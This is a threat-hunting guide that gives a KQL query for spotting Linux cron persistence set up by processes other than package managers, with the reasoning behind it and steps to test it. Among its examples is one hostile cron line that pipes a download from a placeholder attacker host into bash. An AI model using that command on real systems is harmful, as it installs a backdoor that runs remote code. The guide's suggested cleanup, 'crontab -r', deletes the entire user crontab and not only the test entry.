## Linux – Suspicious Cron Persistence – Last 7d

### Query name

**`Linux – Suspicious cron persistence – last 7d`**

### Purpose

Identifies **cron files created or modified by non‑package‑management processes**, which is a strong indicator of:

* Manual persistence
* Script‑based backdoors
* Red team activity
* Post‑exploitation footholds

The query intentionally filters out expected system behaviour (such as `apt` or `dpkg`) to reduce noise.

---

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceFileEvents
| where DeviceId in (LinuxDeviceIds)
| where Timestamp > ago(7d)
| where FolderPath has_any ("/etc/cron", "/var/spool/cron")
| where InitiatingProcessFileName !in (
    "dpkg",
    "apt",
    "apt-get",
    "yum",
    "dnf"
)
| project
    Timestamp,
    DeviceName,
    ActionType,
    FileName,
    FolderPath,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine
| order by Timestamp desc
```

---

### Why this query works well on Linux

Linux attackers rarely invent exotic persistence mechanisms. Instead, they rely on **simple, durable techniques** such as:

* Adding cron jobs
* Modifying existing scheduled tasks
* Dropping scripts that cron executes

By excluding package managers, this query focuses on **human‑ or script‑driven changes**, which dramatically improves signal quality.

---

### Typical malicious or suspicious activity this will surface

* Cron jobs created using `bash`, `sh`, or scripting tools
* Scheduled execution of payloads in `/tmp` or home directories
* Red team persistence mechanisms
* Backdoors that periodically beacon or re‑establish access

Examples include:

* `* * * * * curl http://attacker | bash`
* Hidden cron entries created by shell scripts
* Persistence established immediately after SSH access

---

### Expected benign activity (and why it’s filtered)

Common benign cron changes are usually made by:

* `dpkg`
* `apt` / `apt-get`
* `yum` / `dnf`

These typically occur during:

* Package installation
* System updates
* Maintenance tasks

By excluding these processes, the query avoids alerting on normal OS maintenance.

---

### When to use this query

Use this query when:

* Investigating suspected Linux compromise
* Validating persistence after red team activity
* Hunting for low‑and‑slow backdoors
* Reviewing post‑exploitation behaviour

It is especially effective on **servers**, where cron changes should be rare and intentional.

---

### Testing and validation guidance

To safely test this query, you can create a temporary cron entry:

```bash
(crontab -l 2>/dev/null; echo "* * * * * echo cron-test >> /tmp/cron-test.log") | crontab -
```

After confirming the event appears in Advanced Hunting, remove the cron job:

```bash
crontab -r
```
